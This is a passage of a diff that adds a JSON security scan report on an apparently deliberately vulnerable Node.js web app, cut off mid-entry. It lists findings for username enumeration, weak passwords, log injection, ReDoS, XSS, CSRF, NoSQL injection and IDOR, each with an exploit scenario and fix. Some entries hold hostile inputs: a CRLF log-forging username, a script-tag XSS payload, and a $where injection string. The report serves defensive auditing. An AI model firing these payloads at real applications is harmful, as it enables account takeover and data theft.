+            "cvssRating": "Medium",
+            "category": "CWE-204",
+            "cvssVector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+            "cwe": "CWE-204",
+            "cweId": "CWE-204",
+            "cvssScore": 5.3,
+            "offensivePriority": "P3",
+            "offensivePriorityLabel": "Internal Network / Privileged Position",
+            "offensivePriorityReason": "Internal Network / Privileged Position | *exposure unverified \u2014 no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*",
+            "confidence": 1.0,
+            "description": "#### Description\nThe login error handling returns 'Invalid username' for non-existent users and 'Invalid password' for existing users with wrong passwords. This differential response leaks valid usernames.\n\n#### Impact\nAn attacker can determine which usernames are registered in the system, enabling targeted password guessing or credential stuffing attacks.\n\n#### Exploit scenario\nAn attacker sends a series of POST requests to /login with candidate usernames and a dummy password. By observing whether the response says 'Invalid username' or 'Invalid password', they build a list of valid accounts.\n\n```\nif (err.noSuchUser) {\n    ...\n    loginError: invalidUserNameErrorMessage,\n} else if (err.invalidPassword) {\n    ...\n    loginError: invalidPasswordErrorMessage,\n}\n```\n\n#### How to fix\nChange the error responses to a generic message such as 'Invalid username or password' regardless of which credential is incorrect.\n\n**Exploitability:** Username enumeration via login error messages ('Invalid username' vs 'Invalid password'). Pre-auth, aids brute force.\n\n#### Adversarial verification\n**Verdict:** TRUE_POSITIVE (confidence: 10/10) \u2014 full chain verified: unauthenticated POST /login \u2192 validateLogin differential error \u2192 \"Invalid username\" vs \"Invalid password\" response leaks valid accounts"
+          },
+          "taxa": [
+            {
+              "toolComponent": {
+                "name": "CWE",
+                "guid": "b7c8d9e0-1f2a-3b4c-5d6e-7f8090a1b2c3"
+              },
+              "id": "CWE-204"
+            }
+          ],
+          "rank": 53.0,
+          "partialFingerprints": {
+            "vvaFindingId/v1": "vvaf1_792ca7504a124bf17dbe0b0edc4e9e6a"
+          }
+        },
+        {
+          "ruleId": "CWE-521",
+          "level": "warning",
+          "message": {
+            "text": "Weak Password Complexity Requirement  [CVSS 6.5: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N]"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/routes/session.js"
+                },
+                "region": {
+                  "startLine": 144
+                }
+              }
+            }
+          ],
+          "properties": {
+            "severity": "medium",
+            "security-severity": "6.5",
+            "cvssRating": "Medium",
+            "category": "CWE-521",
+            "cvssVector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",
+            "cwe": "CWE-521",
+            "cweId": "CWE-521",
+            "cvssScore": 6.5,
+            "offensivePriority": "P3",
+            "offensivePriorityLabel": "Internal Network / Privileged Position",
+            "offensivePriorityReason": "Internal Network / Privileged Position | *exposure unverified \u2014 no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*",
+            "confidence": 1.0,
+            "description": "#### Description\nThe signup validation uses PASS_RE = /^.{1,20}$/, which only enforces a length of 1\u201320 characters. It does not require mixed case, digits, or special characters.\n\n#### Impact\nUsers can set trivially weak passwords (e.g., a single character), making accounts highly susceptible to brute-force and dictionary attacks.\n\n#### Exploit scenario\nAfter enumerating a valid username, an attacker attempts common passwords (e.g., '123', 'password') until access is gained.\n\n#### Preconditions\n- Attacker must know or guess a valid username.\n\n```\nconst PASS_RE = /^.{1,20}$/;\n```\n\n#### How to fix\nReplace the weak regex with a stronger policy, e.g., /^(?=.*\\d)(?=.*[a-z])(?=.*[A-Z]).{8,}$/, as shown in the commented-out fix.\n\n**Exploitability:** Weak password policy allows 1-20 char passwords with no complexity requirements. Pre-auth, enables credential guessing.\n\n#### Adversarial verification\n**Verdict:** TRUE_POSITIVE (confidence: 10/10) \u2014 Weak password regex /^.{1,20}$/ on unauthenticated POST /signup route; accepts 1-char passwords with no complexity. Stronger regex commented out. No compensating validation anywhere in the call chain."
+          },
+          "taxa": [
+            {
+              "toolComponent": {
+                "name": "CWE",
+                "guid": "b7c8d9e0-1f2a-3b4c-5d6e-7f8090a1b2c3"
+              },
+              "id": "CWE-521"
+            }
+          ],
+          "rank": 65.0,
+          "partialFingerprints": {
+            "vvaFindingId/v1": "vvaf1_27414d9660499cfa4197ec4f635f1189"
+          }
+        },
+        {
+          "ruleId": "CWE-200: Exposure of Sensitive Information to an Unauthorized Actor",
+          "level": "warning",
+          "message": {
+            "text": "Username enumeration via signup error message  [CVSS 5.3: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N]"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/routes/session.js"
+                },
+                "region": {
+                  "startLine": 213
+                }
+              }
+            }
+          ],
+          "properties": {
+            "severity": "medium",
+            "security-severity": "5.3",
+            "cvssRating": "Medium",
+            "category": "CWE-200: Exposure of Sensitive Information to an Unauthorized Actor",
+            "cvssVector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+            "cwe": "CWE-200 - Exposure of Sensitive Information to an Unauthorized Actor",
+            "cweId": "CWE-200",
+            "cweName": "Exposure of Sensitive Information to an Unauthorized Actor",
+            "cvssScore": 5.3,
+            "offensivePriority": "P3",
+            "offensivePriorityLabel": "Internal Network / Privileged Position",
+            "offensivePriorityReason": "Internal Network / Privileged Position | *exposure unverified \u2014 no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*",
+            "confidence": 0.95,
+            "description": "#### Description\nWhen a new user submits a username that already exists, the signup handler replies with 'User name already in use. Please choose another'. This reveals valid usernames to an unauthenticated attacker.\n\n#### Impact\nAn attacker can enumerate existing usernames by attempting to create an account with a taken username and observing the unique error message.\n\n#### Exploit scenario\n1. Attacker submits POST /signup with a guessed username and other required fields. 2. If the response contains 'User name already in use', the username is registered.\n\n```\nerrors.userNameError = \"User name already in use. Please choose another\";\n```\n\n#### How to fix\nRespond with a generic message that does not reveal whether the username is already taken (e.g., 'Username is invalid or already taken').\n\n**Exploitability:** Username enumeration via signup error ('User name already in use'). Pre-auth, leaks valid usernames.\n\n#### Adversarial verification\n**Verdict:** TRUE_POSITIVE (confidence: 10/10) \u2014 unauthenticated POST /signup returns distinct error for existing usernames; no rate limiting or generic-error mitigation found"
+          },
+          "taxa": [
+            {
+              "toolComponent": {
+                "name": "CWE",
+                "guid": "b7c8d9e0-1f2a-3b4c-5d6e-7f8090a1b2c3"
+              },
+              "id": "CWE-200"
+            }
+          ],
+          "rank": 53.0,
+          "partialFingerprints": {
+            "vvaFindingId/v1": "vvaf1_54bdcc8bff50e40f36fedcbcea9acb20"
+          }
+        },
+        {
+          "ruleId": "CWE-117",
+          "level": "warning",
+          "message": {
+            "text": "Log injection via unsanitized userName in login error  [CVSS 5.3: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N]"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/routes/session.js"
+                },
+                "region": {
+                  "startLine": 64
+                }
+              }
+            }
+          ],
+          "properties": {
+            "severity": "medium",
+            "security-severity": "5.3",
+            "cvssRating": "Medium",
+            "category": "CWE-117",
+            "cvssVector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
+            "cwe": "CWE-117",
+            "cweId": "CWE-117",
+            "cvssScore": 5.3,
+            "offensivePriority": "P3",
+            "offensivePriorityLabel": "Internal Network / Privileged Position",
+            "offensivePriorityReason": "Internal Network / Privileged Position | *exposure unverified \u2014 no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*",
+            "confidence": 0.95,
+            "description": "#### Description\nThe handleLoginRequest handler logs the raw userName directly on line 64 without any sanitization or encoding. The userName is taken from req.body (untrusted network input). Attackers can supply a username containing newline characters (CRLF) to inject arbitrary log lines or control characters to disrupt log analysis. Comments on lines 66-80 even acknowledge this vulnerability and suggest fixes, but the actual code remains vulnerable.\n\n#### Impact\nAn attacker can inject CRLF sequences and ANSI control characters into server logs by providing a specially crafted username during login. This can be used to forge log entries, obfuscate malicious activity, or exploit downstream log processors (e.g., Log Injection to RCE in vulnerable log viewers).\n\n#### Exploit scenario\nAn attacker submits a login request with a username like 'attacker%0d%0aINJECTED: admin login from 10.0.0.99%0d%0a'. The server logs this unescaped input, causing a forged log entry to appear in the log stream. Subsequent log analysis tools or alerting systems may be misled about the origin of other events.\n\n#### Preconditions\n- Attacker can send HTTP requests to the application's login endpoint\n\n```\nconsole.log(\"Error: attempt to login with invalid user: \", userName);\n```\n\n#### How to fix\nSanitize log output by stripping or encoding control characters from user-supplied strings before logging. Replace the direct interpolation on line 64 with a safe logging format (e.g., console.log('Error: %s', safeUserName)) or encode newlines/CRLF as shown in the existing comments (lines 66-80).\n\n**Exploitability:** Log injection via CRLF in login username. Pre-auth, can disrupt log integrity but no direct exploit chain.\n\n#### Adversarial verification\n**Verdict:** TRUE_POSITIVE (confidence: 9/10) \u2014 Untrusted req.body.userName flows unsanitized into console.log on an unauthenticated POST /login route; CRLF injection can forge log entries in downstream log aggregation/analysis systems."
+          },
+          "taxa": [
+            {
+              "toolComponent": {
+                "name": "CWE",
+                "guid": "b7c8d9e0-1f2a-3b4c-5d6e-7f8090a1b2c3"
+              },
+              "id": "CWE-117"
+            }
+          ],
+          "rank": 53.0,
+          "partialFingerprints": {
+            "vvaFindingId/v1": "vvaf1_c157c86c5dd3ba5f21c5b9cc066fff45"
+          }
+        },
+        {
+          "ruleId": "CWE-1333: Inefficient Regular Expression Complexity",
+          "level": "warning",
+          "message": {
+            "text": "ReDoS in bankRouting regex on profile update  [CVSS 6.5: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H]"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/routes/profile.js"
+                },
+                "region": {
+                  "startLine": 59
+                }
+              }
+            }
+          ],
+          "properties": {
+            "severity": "medium",
+            "security-severity": "6.5",
+            "cvssRating": "Medium",
+            "category": "CWE-1333: Inefficient Regular Expression Complexity",
+            "cvssVector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H",
+            "cwe": "CWE-1333 - Inefficient Regular Expression Complexity",
+            "cweId": "CWE-1333",
+            "cweName": "Inefficient Regular Expression Complexity",
+            "cvssScore": 6.5,
+            "offensivePriority": "P3",
+            "offensivePriorityLabel": "Internal Network / Privileged Position",
+            "offensivePriorityReason": "Internal Network / Privileged Position | *exposure unverified \u2014 no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*",
+            "confidence": 0.95,
+            "description": "#### Description\nhandleProfileUpdate destructures bankRouting from req.body at line 49 and tests it against the regex /([0-9]+)+\\#/ at line 61. The nested quantifier ([0-9]+)+ is applied to user-controlled digits. When the input contains many digits but no terminating '#', the regex engine explores an exponential number of digit partitions before failing. No type check, length limit, or timeout exists before the vulnerable test.\n\n#### Impact\nA single authenticated request can cause exponential regex backtracking that ties up the Node.js event loop, making the entire application unresponsive for all users.\n\n#### Exploit scenario\nLog in as any user. Submit a POST to /profile with bankRouting set to 30,000 digits followed by '!' (or any non-'#' suffix) and the other required body fields. The regex test on line 61 consumes CPU during catastrophic backtracking, blocking the event loop and denying service to other users.\n\n#### Preconditions\n- A valid user account (registration is open)\n\n```\nconst regexPattern = /([0-9]+)+\\#/;\nconst testComplyWithRequirements = regexPattern.test(bankRouting);\n```\n\n#### How to fix\nReplace the vulnerable regex with a linear anchored pattern such as /^[0-9]+#$/ or at least remove the outer '+' quantifier. Also validate that bankRouting is a string and enforce a short maximum length before testing.\n\n**Exploitability:** ReDoS in bankRouting regex allows denial of service. Requires authenticated request; can be used to degrade availability.\n\n#### Adversarial verification\n**Verdict:** TRUE_POSITIVE (confidence: 10/10) \u2014 Confirmed vulnerable regex on authenticated POST /profile with no upstream validation, length limit, or timeout."
+          },
+          "taxa": [
+            {
+              "toolComponent": {
+                "name": "CWE",
+                "guid": "b7c8d9e0-1f2a-3b4c-5d6e-7f8090a1b2c3"
+              },
+              "id": "CWE-1333"
+            }
+          ],
+          "rank": 65.0,
+          "partialFingerprints": {
+            "vvaFindingId/v1": "vvaf1_79360e3d22c97a693c4b97e456da7299"
+          }
+        },
+        {
+          "ruleId": "CWE-79: Improper Neutralization of Input During Web Page Generation (Cross-site Scripting)",
+          "level": "warning",
+          "message": {
+            "text": "Reflected XSS in signup error via userName  [CVSS 5.4: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N]"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/routes/session.js"
+                },
+                "region": {
+                  "startLine": 249
+                }
+              }
+            }
+          ],
+          "properties": {
+            "severity": "medium",
+            "security-severity": "5.4",
+            "cvssRating": "Medium",
+            "category": "CWE-79: Improper Neutralization of Input During Web Page Generation (Cross-site Scripting)",
+            "cvssVector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
+            "cwe": "CWE-79 - Improper Neutralization of Input During Web Page Generation (Cross-site Scripting)",
+            "cweId": "CWE-79",
+            "cweName": "Improper Neutralization of Input During Web Page Generation (Cross-site Scripting)",
+            "cvssScore": 5.4,
+            "offensivePriority": "P3",
+            "offensivePriorityLabel": "Internal Network / Privileged Position",
+            "offensivePriorityReason": "Internal Network / Privileged Position | *exposure unverified \u2014 no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*",
+            "confidence": 1.0,
+            "description": "*23 additional call site(s) collapsed during dedup \u2014 same root cause; each location needs the same fix applied.*\n\n#### Description\nIn handleSignup, when validation fails, the errors object containing unescaped userName and email is rendered in the signup template without encoding. With autoescape false, this results in XSS. Similar vulnerabilities exist in the duplicate-user and dashboard success renders.\n\n#### Impact\nAn attacker can execute arbitrary JavaScript in a victim's browser by getting them to submit a crafted signup request, leading to credential theft or account compromise.\n\n#### Exploit scenario\nAn attacker hosts a page that sends a POST to /signup with userName='<script>alert(1)</script>' and a mismatched password. The response renders the script, executing it in the victim's browser.\n\n#### Preconditions\n- Victim submits a crafted POST to /signup\n- autoescape false\n\n```\nreturn res.render(\"signup\", {\n    ...errors,\n    environmentalScripts\n});\n```\n\n#### How to fix\nEscape all user-controlled data before rendering templates. In the signup route, apply HTML encoding to userName, email, etc., or enable Swig autoescaping.\n\n**Exploitability:** Reflected XSS in signup error due to autoescape=false. Pre-auth, requires user click. Combined with missing httpOnly, can steal cookies.\n\n#### Adversarial verification\n**Verdict:** TRUE_POSITIVE (confidence: 10/10) \u2014 user-controlled userName from req.body flows unsanitized into res.render with Swig autoescape:false; rendered in HTML attribute context without encoding on unauthenticated POST /signup",
+            "dedupRelatedLocationCount": 23
+          },
+          "taxa": [
+            {
+              "toolComponent": {
+                "name": "CWE",
+                "guid": "b7c8d9e0-1f2a-3b4c-5d6e-7f8090a1b2c3"
+              },
+              "id": "CWE-79"
+            }
+          ],
+          "relatedLocations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/routes/session.js"
+                },
+                "region": {
+                  "startLine": 82
+                }
+              },
+              "message": {
+                "text": "Additional call site \u2014 collapsed during dedup; same root cause as the primary location and needs the same fix."
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/routes/session.js"
+                },
+                "region": {
+                  "startLine": 239,
+                  "endLine": 242
+                }
+              },
+              "message": {
+                "text": "Additional call site \u2014 collapsed during dedup; same root cause as the primary location and needs the same fix."
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/routes/session.js"
+                },
+                "region": {
+                  "startLine": 269,
+                  "endLine": 272
+                }
+              },
+              "message": {
+                "text": "Additional call site \u2014 collapsed during dedup; same root cause as the primary location and needs the same fix."
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/routes/session.js"
+                },
+                "region": {
+                  "startLine": 214,
+                  "endLine": 217
+                }
+              },
+              "message": {
+                "text": "Additional call site \u2014 collapsed during dedup; same root cause as the primary location and needs the same fix."
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/routes/session.js"
+                },
+                "region": {
+                  "startLine": 91,
+                  "endLine": 94
+                }
+              },
+              "message": {
+                "text": "Additional call site \u2014 collapsed during dedup; same root cause as the primary location and needs the same fix."
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/routes/session.js"
+                },
+                "region": {
+                  "startLine": 126,
+                  "endLine": 135
+                }
+              },
+              "message": {
+                "text": "Additional call site \u2014 collapsed during dedup; same root cause as the primary location and needs the same fix."
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/routes/tutorial.js"
+                },
+                "region": {
+                  "startLine": 30,
+                  "endLine": 37
+                }
+              },
+              "message": {
+                "text": "Additional call site \u2014 collapsed during dedup; same root cause as the primary location and needs the same fix."
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/routes/session.js"
+                },
+                "region": {
+                  "startLine": 45,
+                  "endLine": 51
+                }
+              },
+              "message": {
+                "text": "Additional call site \u2014 collapsed during dedup; same root cause as the primary location and needs the same fix."
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/routes/profile.js"
+                },
+                "region": {
+                  "startLine": 65,
+                  "endLine": 75
+                }
+              },
+              "message": {
+                "text": "Additional call site \u2014 collapsed during dedup; same root cause as the primary location and needs the same fix."
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/routes/profile.js"
+                },
+                "region": {
+                  "startLine": 100,
+                  "endLine": 103
+                }
+              },
+              "message": {
+                "text": "Additional call site \u2014 collapsed during dedup; same root cause as the primary location and needs the same fix."
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/routes/profile.js"
+                },
+                "region": {
+                  "startLine": 33,
+                  "endLine": 36
+                }
+              },
+              "message": {
+                "text": "Additional call site \u2014 collapsed during dedup; same root cause as the primary location and needs the same fix."
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/routes/benefits.js"
+                },
+                "region": {
+                  "startLine": 29,
+                  "endLine": 51
+                }
+              },
+              "message": {
+                "text": "Additional call site \u2014 collapsed during dedup; same root cause as the primary location and needs the same fix."
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/routes/memos.js"
+                },
+                "region": {
+                  "startLine": 11,
+                  "endLine": 17
+                }
+              },
+              "message": {
+                "text": "Additional call site \u2014 collapsed during dedup; same root cause as the primary location and needs the same fix."
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "server.js"
+                },
+                "region": {
+                  "startLine": 135,
+                  "endLine": 142
+                }
+              },
+              "message": {
+                "text": "Additional call site \u2014 collapsed during dedup; same root cause as the primary location and needs the same fix."
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/views/profile.html"
+                },
+                "region": {
+                  "startLine": 78
+                }
+              },
+              "message": {
+                "text": "Additional call site \u2014 collapsed during dedup; same root cause as the primary location and needs the same fix."
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/views/login.html"
+                },
+                "region": {
+                  "startLine": 101
+                }
+              },
+              "message": {
+                "text": "Additional call site \u2014 collapsed during dedup; same root cause as the primary location and needs the same fix."
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/views/allocations.html"
+                },
+                "region": {
+                  "startLine": 38,
+                  "endLine": 47
+                }
+              },
+              "message": {
+                "text": "Additional call site \u2014 collapsed during dedup; same root cause as the primary location and needs the same fix."
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/views/contributions.html"
+                },
+                "region": {
+                  "startLine": 65
+                }
+              },
+              "message": {
+                "text": "Additional call site \u2014 collapsed during dedup; same root cause as the primary location and needs the same fix."
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/views/layout.html"
+                },
+                "region": {
+                  "startLine": 125,
+                  "endLine": 127
+                }
+              },
+              "message": {
+                "text": "Additional call site \u2014 collapsed during dedup; same root cause as the primary location and needs the same fix."
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/views/profile.html"
+                },
+                "region": {
+                  "startLine": 60
+                }
+              },
+              "message": {
+                "text": "Additional call site \u2014 collapsed during dedup; same root cause as the primary location and needs the same fix."
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/views/signup.html"
+                },
+                "region": {
+                  "startLine": 57
+                }
+              },
+              "message": {
+                "text": "Additional call site \u2014 collapsed during dedup; same root cause as the primary location and needs the same fix."
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/views/memos.html"
+                },
+                "region": {
+                  "startLine": 31
+                }
+              },
+              "message": {
+                "text": "Additional call site \u2014 collapsed during dedup; same root cause as the primary location and needs the same fix."
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/views/login.html"
+                },
+                "region": {
+                  "startLine": 110
+                }
+              },
+              "message": {
+                "text": "Additional call site \u2014 collapsed during dedup; same root cause as the primary location and needs the same fix."
+              }
+            }
+          ],
+          "rank": 54.0,
+          "partialFingerprints": {
+            "vvaFindingId/v1": "vvaf1_5997dce5af56659d9f4cacd6555ead7e"
+          }
+        },
+        {
+          "ruleId": "CWE-352: Cross-Site Request Forgery (CSRF)",
+          "level": "warning",
+          "message": {
+            "text": "Missing CSRF protection on profile update  [CVSS 6.5: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N]"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/routes/profile.js"
+                },
+                "region": {
+                  "startLine": 78
+                }
+              }
+            }
+          ],
+          "properties": {
+            "severity": "medium",
+            "security-severity": "6.5",
+            "cvssRating": "Medium",
+            "category": "CWE-352: Cross-Site Request Forgery (CSRF)",
+            "cvssVector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N",
+            "cwe": "CWE-352 - Cross-Site Request Forgery (CSRF)",
+            "cweId": "CWE-352",
+            "cweName": "Cross-Site Request Forgery (CSRF)",
+            "cvssScore": 6.5,
+            "offensivePriority": "P3",
+            "offensivePriorityLabel": "Internal Network / Privileged Position",
+            "offensivePriorityReason": "Internal Network / Privileged Position | *exposure unverified \u2014 no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*",
+            "confidence": 0.75,
+            "description": "*1 additional call site(s) collapsed during dedup \u2014 same root cause; each location needs the same fix applied.*\n\n#### Description\nhandleProfileUpdate is a state-changing POST endpoint that persists all profile fields using the session userId at line 82. The handler never validates a CSRF token or same-origin signal. Since the session cookie is sent automatically with cross-site form POSTs, the update can be initiated by an attacker's page without user consent.\n\n#### Impact\nA malicious website can silently submit a profile update using a victim's existing session, modifying their stored SSN, date of birth, bank account, address, and routing number. This violates profile integrity and can be chained with stored XSS.\n\n#### Exploit scenario\nAttacker creates a page containing an auto-submitting form to /profile with arbitrary profile fields. A logged-in victim visits the page; the browser attaches their session cookie and submits the update, changing the victim's bankAccount and address.\n\n#### Preconditions\n- Victim is logged into the application\n- Victim visits an attacker-controlled page or clicks a link\n\n```\nprofile.updateUser(\n    parseInt(userId),\n    firstName,\n    lastName,\n    ssn,\n    dob,\n    address,\n    bankAcc,\n    bankRouting,\n    (err, user) => {\n```\n\n#### How to fix\nApply CSRF token validation to mutating routes. In app/routes/profile.js, reject requests at or before line 82 unless a valid per-session CSRF token accompanies the request; additionally set SameSite=Lax or Strict on the session cookie.\n\n**Exploitability:** Missing CSRF protection on profile update. Attackers can craft cross-site requests to modify user profiles. Post-auth, requires victim interaction.\n\n#### Adversarial verification\n**Verdict:** TRUE_POSITIVE (confidence: 10/10) \u2014 CSRF middleware (csurf) is commented out in server.js; no sameSite cookie, no origin/referer check, no token validation on the /profile POST handler; attacker can forge cross-site requests that modify victim's bank account, SSN, and PII via session cookie replay.",
+            "dedupRelatedLocationCount": 1
+          },
+          "taxa": [
+            {
+              "toolComponent": {
+                "name": "CWE",
+                "guid": "b7c8d9e0-1f2a-3b4c-5d6e-7f8090a1b2c3"
+              },
+              "id": "CWE-352"
+            }
+          ],
+          "relatedLocations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/routes/index.js"
+                },
+                "region": {
+                  "startLine": 51,
+                  "endLine": 52
+                }
+              },
+              "message": {
+                "text": "Additional call site \u2014 collapsed during dedup; same root cause as the primary location and needs the same fix."
+              }
+            }
+          ],
+          "rank": 65.0,
+          "partialFingerprints": {
+            "vvaFindingId/v1": "vvaf1_616213b8e889d6bbc5ab922f204074cd"
+          }
+        },
+        {
+          "ruleId": "CWE-943",
+          "level": "warning",
+          "message": {
+            "text": "NoSQL injection through threshold query parameter  [CVSS 6.5: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N]"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/routes/allocations.js"
+                },
+                "region": {
+                  "startLine": 20
+                }
+              }
+            }
+          ],
+          "properties": {
+            "severity": "medium",
+            "security-severity": "6.5",
+            "cvssRating": "Medium",
+            "category": "CWE-943",
+            "cvssVector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
+            "cwe": "CWE-943",
+            "cweId": "CWE-943",
+            "cvssScore": 6.5,
+            "offensivePriority": "P3",
+            "offensivePriorityLabel": "Internal Network / Privileged Position",
+            "offensivePriorityReason": "Internal Network / Privileged Position | *exposure unverified \u2014 no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*",
+            "confidence": 0.85,
+            "description": "*1 additional call site(s) collapsed during dedup \u2014 same root cause; each location needs the same fix applied.*\n\n#### Description\ndisplayAllocations destructures threshold from req.query with no validation and passes it directly to allocationsDAO.getByUserIdAndThreshold(userId, threshold, ...). Inside that DAO method the threshold value is concatenated into a Mongo $where JavaScript expression. Since the value is not coerced to a number or allow-listed, an attacker can break out of the expression and alter the query logic.\n\n#### Impact\nAn authenticated attacker can manipulate the threshold parameter to inject JavaScript into the Mongo $where clause, likely gaining access to all allocation records regardless of the userId and potentially causing server-side code execution inside the database query.\n\n#### Exploit scenario\nAn authenticated user requests GET /allocations/victim123?threshold=0;return true;//. The value is interpolated into the $where expression, causing MongoDB to execute the injected JavaScript and return allocations the user should not see.\n\n#### Preconditions\n- Attacker has any authenticated session\n- threshold parameter is accepted as a string and interpolated into $where\n\n```\nconst { threshold } = req.query;\n\nallocationsDAO.getByUserIdAndThreshold(userId, threshold, (err, allocations) => {\n```\n\n#### How to fix\nValidate or coerce threshold to a number in displayAllocations or in the DAO, and replace $where string interpolation with a parameterized MongoDB query operator.\n\n**Exploitability:** NoSQL injection via threshold parameter in allocations. Authenticated user can extract arbitrary data. Post-auth.\n\n#### Adversarial verification\n**Verdict:** TRUE_POSITIVE (confidence: 10/10) \u2014 Full call chain verified from Express route \u2192 handler \u2192 DAO \u2192 $where interpolation; no validation anywhere; fix intentionally commented out; any authenticated user can exploit.",
+            "dedupRelatedLocationCount": 1
+          },
+          "taxa": [
+            {
+              "toolComponent": {
+                "name": "CWE",
+                "guid": "b7c8d9e0-1f2a-3b4c-5d6e-7f8090a1b2c3"
+              },
+              "id": "CWE-943"
+            }
+          ],
+          "relatedLocations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/data/allocations-dao.js"
+                },
+                "region": {
+                  "startLine": 57,
+                  "endLine": 86
+                }
+              },
+              "message": {
+                "text": "Additional call site \u2014 collapsed during dedup; same root cause as the primary location and needs the same fix."
+              }
+            }
+          ],
+          "rank": 65.0,
+          "partialFingerprints": {
+            "vvaFindingId/v1": "vvaf1_1c9ab2d856e290cb4b864080f9559c3a"
+          }
+        },
+        {
+          "ruleId": "CWE-639: Authorization Bypass Through User-Controlled Key",
+          "level": "warning",
+          "message": {
+            "text": "Insecure Direct Object Reference in memo display  [CVSS 4.3: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N]"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/routes/memos.js"
+                },
+                "region": {
+                  "startLine": 19
+                }
+              }
+            }
+          ],
+          "properties": {
+            "severity": "medium",
+            "security-severity": "4.3",
+            "cvssRating": "Medium",
+            "category": "CWE-639: Authorization Bypass Through User-Controlled Key",
+            "cvssVector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N",
+            "cwe": "CWE-639 - Authorization Bypass Through User-Controlled Key",
+            "cweId": "CWE-639",
+            "cweName": "Authorization Bypass Through User-Controlled Key",
+            "cvssScore": 4.3,
+            "offensivePriority": "P3",
+            "offensivePriorityLabel": "Internal Network / Privileged Position",
+            "offensivePriorityReason": "Internal Network / Privileged Position | *exposure unverified \u2014 no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*",
+            "confidence": 0.95,
